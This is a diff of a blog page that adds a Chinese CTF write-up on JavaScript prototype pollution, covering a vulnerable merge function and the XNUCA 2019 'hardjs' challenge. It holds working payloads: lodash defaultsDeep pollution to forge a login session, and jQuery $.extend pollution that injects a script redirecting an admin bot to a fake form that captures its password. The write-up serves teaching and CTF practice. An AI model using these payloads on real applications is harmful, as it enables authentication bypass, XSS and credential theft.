@@ -6,15 +6,22 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://corrupt7.github.io">
-  <title>Archives: 2021/11 | Satori &#39;s blog</title>
+  <title>CTF 中的Javascript 原型链污染 | Satori &#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Satori &#39;s blog">
-<meta property="og:url" content="https://corrupt7.github.io/archives/2021/11/index.html">
+  <meta name="description" content="CTF 中的Javascript 原型链污染0x00 关于本文什么是原型链污染?两篇文章[1][2]已经讲的很好了,还有两道实战,入门已经足够了。本文主要对遇到的一些JavaScript原型链污染做些记录或对网上的一些文章进行更深入的分析..(技术有限,不对的地方希望各位指出)如果后续遇到什么高质量的题目也会放出来分享。   0x01 理解Merge 类操作导致原型链污染对于如下一个例子 1234">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF 中的Javascript 原型链污染">
+<meta property="og:url" content="https://corrupt7.github.io/2021/07/28/hbs%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="Satori &#39;s blog">
+<meta property="og:description" content="CTF 中的Javascript 原型链污染0x00 关于本文什么是原型链污染?两篇文章[1][2]已经讲的很好了,还有两道实战,入门已经足够了。本文主要对遇到的一些JavaScript原型链污染做些记录或对网上的一些文章进行更深入的分析..(技术有限,不对的地方希望各位指出)如果后续遇到什么高质量的题目也会放出来分享。   0x01 理解Merge 类操作导致原型链污染对于如下一个例子 1234">
 <meta property="og:locale">
+<meta property="og:image" content="https://blog.szfszf.top/static/article/bd2795a558329adb888062b426780703.png">
+<meta property="article:published_time" content="2021-07-28T12:06:28.000Z">
+<meta property="article:modified_time" content="2021-11-12T11:10:16.650Z">
 <meta property="article:author" content="Corrupt">
+<meta property="article:tag" content="javascript">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.szfszf.top/static/article/bd2795a558329adb888062b426780703.png">
   
     <link rel="alternative" href="/atom.xml" title="Satori &#39;s blog" type="application/atom+xml">
   
@@ -144,43 +151,253 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-hbs模板注入" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      CTF 中的Javascript 原型链污染
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/11/12/hbs%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" class="archive-article-date">
-  	<time datetime="2021-11-12T11:04:31.452Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-11-12</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
+        
+        <a href="/2021/07/28/hbs%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" class="archive-article-date">
+  	<time datetime="2021-07-28T12:06:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-28</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="CTF-中的Javascript-原型链污染"><a href="#CTF-中的Javascript-原型链污染" class="headerlink" title="CTF 中的Javascript 原型链污染"></a>CTF 中的Javascript 原型链污染</h1><h2 id="0x00-关于本文"><a href="#0x00-关于本文" class="headerlink" title="0x00 关于本文"></a>0x00 关于本文</h2><p>什么是原型链污染?两篇文章<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4229">[1]</a><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/236182#h3-10">[2]</a>已经讲的很好了,还有两道实战,入门已经足够了。本文主要对遇到的一些JavaScript原型链污染做些记录或对网上的一些文章进行更深入的分析..(技术有限,不对的地方希望各位指出)<br>如果后续遇到什么高质量的题目也会放出来分享。</p>
+<hr>
+<hr>
+<h2 id="0x01-理解Merge-类操作导致原型链污染"><a href="#0x01-理解Merge-类操作导致原型链污染" class="headerlink" title="0x01 理解Merge 类操作导致原型链污染"></a>0x01 理解Merge 类操作导致原型链污染</h2><p>对于如下一个例子</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://m.runoob.com/json/json-parse.html">JSON.parse()</a> ——将一个JSON<br>字符串转换成一个对象</p>
+</blockquote>
+<hr>
+<ul>
+<li>首先我们传入了两个对象o1与o2,两个对象都继承于object,o2则被我们增加属性a,与__proto__属性的b。</li>
+</ul>
+<blockquote>
+<p>注意，这里在JSON反序列化object2对象的时候并没有触发原型链污染<br>这是因为这里我们let o2 = {a: 1, “<code>__proto__</code>“: {b: 2}}中JSON.parse() 将 <code>__proto__</code> 变成了对象的自身属性，而且并未改动对象的原型对象。可以看一下与直接污染原型所生成对象的区别(不同版本有区别详细可以看这篇<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ab3de959e19c">测试</a>)</p>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="attr">__proto__</span>: &#123;…&#125;&#125;</span><br><span class="line"><span class="attr">a</span>: <span class="number">1</span> x</span><br><span class="line"><span class="attr">__proto__</span>: &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;</span><br><span class="line">[[Prototype]]: <span class="built_in">Object</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">a</span>: <span class="number">1</span>&#125;</span><br><span class="line"><span class="attr">a</span>: <span class="number">1</span> </span><br><span class="line">[[Prototype]]: <span class="built_in">Object</span></span><br></pre></td></tr></table></figure>
+<p><strong>那么，如何让__proto__被认为是一原型呢？</strong>   </p>
+<ul>
+<li>Merge()这个函数对这个函数对 source 对象中的所有属性进行迭代（因为对象 source 在键值对相同的情况下拥有更高的优先级）<br>如果属性同时存在于第一个和第二个参数中，且他们都是 Object，它就会递归地合并这个属性。</li>
+<li>而o1和o2同时有<code>__proto__</code>对象，所以在第二次递归时会将b的赋给a的proto，即原型object的prototype,而继承于Object的所有对象都会赋上该值造成污染</li>
+</ul>
+<hr>
+<hr>
+<h2 id="0x02实战1-Xnuca2019-Hardjs"><a href="#0x02实战1-Xnuca2019-Hardjs" class="headerlink" title="0x02实战1 Xnuca2019 Hardjs"></a>0x02实战1 Xnuca2019 Hardjs</h2><p><a target="_blank" rel="noopener" href="https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs">源码</a>可以自己试着搭环境(<em>配置数据库和安装完依赖性就可以再source目录使用npm start开启服务了</em>)<br>这题目给了源码，后台主要功能就是接收用户输入，插入数据库，然后可以打印出来<br>这里直接跳到问题代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//server.js</span></span><br><span class="line">...</span><br><span class="line">app.get(<span class="string">&quot;/get&quot;</span>,auth,<span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> userid = req.session.userid ; </span><br><span class="line">    <span class="keyword">var</span> sql = <span class="string">&quot;select count(*) count from `html` where userid= ?&quot;</span></span><br><span class="line">    <span class="comment">// var sql = &quot;select `dom` from  `html` where userid=? &quot;;</span></span><br><span class="line">    <span class="keyword">var</span> dataList = <span class="keyword">await</span> query(sql,[userid]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(dataList[<span class="number">0</span>].count == <span class="number">0</span> )&#123;</span><br><span class="line">        res.json(&#123;&#125;)</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(dataList[<span class="number">0</span>].count &gt; <span class="number">5</span>) &#123; <span class="comment">// if len &gt; 5 , merge all and update mysql</span></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;Merge the recorder in the database.&quot;</span>); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">&quot;select `id`,`dom` from  `html` where userid=? &quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> raws = <span class="keyword">await</span> query(sql,[userid]);</span><br><span class="line">        <span class="keyword">var</span> doms = &#123;&#125;</span><br><span class="line">        <span class="keyword">var</span> ret = <span class="keyword">new</span> <span class="built_in">Array</span>(); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;raws.length ;i++)&#123;</span><br><span class="line">            lodash.defaultsDeep(doms,<span class="built_in">JSON</span>.parse( raws[i].dom ));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> sql = <span class="string">&quot;delete from `html` where id = ?&quot;</span>;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="keyword">await</span> query(sql,raws[i].id);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">&quot;insert into `html` (`userid`,`dom`) values (?,?) &quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> result = <span class="keyword">await</span> query(sql,[userid, <span class="built_in">JSON</span>.stringify(doms)]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(result.affectedRows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            ret.push(doms);</span><br><span class="line">            res.json(ret);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.json([&#123;&#125;]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;Return recorder is less than 5,so return it without merge.&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">&quot;select `dom` from  `html` where userid=? &quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> raws = <span class="keyword">await</span> query(sql,[userid]);</span><br><span class="line">        <span class="keyword">var</span> ret = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>( <span class="keyword">var</span> i =<span class="number">0</span> ;i&lt; raws.length ; i++)&#123;</span><br><span class="line">            ret.push(<span class="built_in">JSON</span>.parse( raws[i].dom ));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(ret);</span><br><span class="line">        res.json(ret);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">app.post(<span class="string">&quot;/add&quot;</span>,auth,<span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(req.body.type &amp;&amp; req.body.content)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> newContent = &#123;&#125;</span><br><span class="line">        <span class="keyword">var</span> userid = req.session.userid;</span><br><span class="line"></span><br><span class="line">        newContent[req.body.type] = [ req.body.content ]</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;newContent:&quot;</span>,newContent);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">&quot;insert into `html` (`userid`,`dom`) values (?,?) &quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> result = <span class="keyword">await</span> query(sql,[userid, <span class="built_in">JSON</span>.stringify(newContent) ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(result.affectedRows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            res.json(newContent);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.json(&#123;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>当html表数据超过5条时，会调用lodash的defaultsDeep函数将其合并,而loadsh 库低版本存在原型链污染漏洞,运行以下漏洞就可知道是否存在</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mergeFn = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>).defaultsDeep;</span><br><span class="line"><span class="keyword">const</span> payload = <span class="string">&#x27;&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;a0&quot;: true&#125;&#125;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    mergeFn(&#123;&#125;, <span class="built_in">JSON</span>.parse(payload));</span><br><span class="line">    <span class="keyword">if</span> ((&#123;&#125;)[<span class="string">`a0`</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`Vulnerable to Prototype Pollution via <span class="subst">$&#123;payload&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">check();</span><br></pre></td></tr></table></figure>
+<p>其中漏洞关键触发点在<a target="_blank" rel="noopener" href="https://github.com/lodash/lodash">defaultsDeep函数</a>，根据文档，这个函数会将分配来源对象的可枚举属性到目标对象所有解析为 undefined 的属性上。 来源对象从左到右应用。 一旦设置了相同属性的值，后续的将被忽略掉。它将({}, JSON.parse(payload))merge时，就可能导致原型链污染。</p>
+<p>再看到登入验证auth函数中通过判断req对象属性的值，所以就可以构造payload来污染session来</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// var session = req.session;</span></span><br><span class="line">    <span class="keyword">if</span>(!req.session.login || !req.session.userid )&#123;</span><br><span class="line">        res.redirect(<span class="number">302</span>,<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        next();</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>所以我们先随便注册个账号,/add下先随便post五条数据后再post如下json</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;test&quot;</span>,<span class="attr">&quot;content&quot;</span>:&#123;<span class="attr">&quot;constructor&quot;</span>:&#123;<span class="attr">&quot;prototype&quot;</span>:&#123;<span class="attr">&quot;login&quot;</span>:<span class="literal">true</span>,<span class="attr">&quot;userid&quot;</span>:<span class="number">1</span>&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>此时,再访问/get目录触发lodash.defaultsDeep触发污染,因为在源码中我们看到了robot.py脚本，从中看到利用selenium登录网站，而密码就是flag。这样的话，前端如果能XSS就可以拿flag了。</p>
+<p>这里用到JQuery 原型链污染JQuery 是一个非常流行的Js前端工具库，而它也存在原型链污染漏洞，CVE：CVE-2019-11358， 版本小于3.4.0时在 ,Jquery可以用$.extend将两个字典merge，而这也因此污染了原型链。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test</span></span><br><span class="line">$.extend(<span class="literal">true</span>,&#123;&#125;,<span class="built_in">JSON</span>.parse(<span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;aa&quot;:&quot;hello&quot;&#125;&#125;&#x27;</span>))</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog.szfszf.top/static/article/bd2795a558329adb888062b426780703.png"></p>
+<p>在前端获取后台数据时调用了$.extent函数merge数据</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAll</span>(<span class="params">allNode</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        <span class="attr">url</span>:<span class="string">&quot;/get&quot;</span>,</span><br><span class="line">        <span class="attr">type</span>:<span class="string">&quot;get&quot;</span>,</span><br><span class="line">        <span class="attr">async</span>:<span class="literal">false</span>,</span><br><span class="line">        <span class="attr">success</span>: <span class="function"><span class="keyword">function</span>(<span class="params">datas</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span> ;i&lt;datas.length; i++)&#123;</span><br><span class="line">                $.extend(<span class="literal">true</span>,allNode,datas[i])</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>接下来需要找到漏洞利用点。看看哪个函数调用了GETALL,发现用js生成模板时，遍历了hints数组并将hints数组里面的内容写入到对应li标签中。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params">$</span>) </span>&#123;</span><br><span class="line"><span class="keyword">const</span> viewer = <span class="keyword">new</span> Viewer(<span class="built_in">document</span>.querySelector(<span class="string">&#x27;#viewer&#x27;</span>));    </span><br><span class="line">	getAll(viewer.allNode);</span><br><span class="line">	viewer.render();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// init hint </span></span><br><span class="line">	(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">var</span> hints = &#123;</span><br><span class="line">			<span class="attr">header</span> : <span class="string">&quot;自定义内容&quot;</span>,</span><br><span class="line">			<span class="attr">notice</span>: <span class="string">&quot;自定义公告&quot;</span>,</span><br><span class="line">			<span class="attr">wiki</span> : <span class="string">&quot;自定义wiki&quot;</span>,</span><br><span class="line">			<span class="attr">button</span>:<span class="string">&quot;自定义内容&quot;</span>,</span><br><span class="line">			<span class="attr">message</span>: <span class="string">&quot;自定义留言内容&quot;</span></span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="keyword">for</span>(key <span class="keyword">in</span> hints)&#123;</span><br><span class="line">			element = $(<span class="string">&quot;li[type=&#x27;&quot;</span>+key+<span class="string">&quot;&#x27;]&quot;</span>); </span><br><span class="line">			<span class="keyword">if</span>(element)&#123;</span><br><span class="line">				element.find(<span class="string">&quot;span.content&quot;</span>).html(hints[key]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;)();</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+<p>我们查看index.ejs中，含有type属性的li标签除了上面写的五个还有一个logger</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">type</span>=<span class="string">&quot;logger&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-sm-12 col-sm-centered&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">pre</span> <span class="attr">class</span>=<span class="string">&quot;am-pre-scrollable&quot;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;am-text-success&quot;</span>&gt;</span>[Tue Jan 11 17:32:52 9]<span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;am-text-danger&quot;</span>&gt;</span>[info]<span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span>&gt;</span>StoreHtml init success .....<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这样我们可以尝试污染logger变量，使得hints含有logger属性，从而将logger内容打印到页面中实现XSS</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;test&quot;</span>,<span class="attr">&quot;content&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>: &#123;<span class="attr">&quot;logger&quot;</span>: <span class="string">&quot;&lt;script&gt;window.location=&#x27;127.0.0.1/index.html&#x27;&lt;/script&gt;&quot;</span>&#125;&#125;&#125;</span><br><span class="line">```html</span><br><span class="line"><span class="comment">//index.html</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;#&quot;</span> method=<span class="string">&quot;get&quot;</span> class=<span class="string">&quot;am-form&quot;</span>&gt;</span><br><span class="line">        &lt;label for=<span class="string">&quot;email&quot;</span>&gt;用户名:&lt;/label&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> id=<span class="string">&quot;email&quot;</span> value=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;label for=<span class="string">&quot;password&quot;</span>&gt;密码:&lt;/label&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span> id=<span class="string">&quot;password&quot;</span> value=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;div class=<span class="string">&quot;am-cf&quot;</span>&gt;</span><br><span class="line">          &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;&quot;</span> value=<span class="string">&quot;登录&quot;</span> class=<span class="string">&quot;am-btn am-btn-primary am-btn-sm am-fl&quot;</span>&gt;</span><br><span class="line">          &lt;input type=<span class="string">&quot;button&quot;</span> onclick=<span class="string">&quot;location.replace(&#x27;&lt;%= next %&gt;&#x27;)&quot;</span> value=<span class="string">&quot;注册&quot;</span> class=<span class="string">&quot;am-btn am-btn-default am-btn-sm am-fr&quot;</span>&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>因为不用登陆即可进入这个页面，那么robot就会向location跳转的我的页面提交账号密码，然后只要在服务器构造好一个表单，记录发送过来的post数据就行。</p>
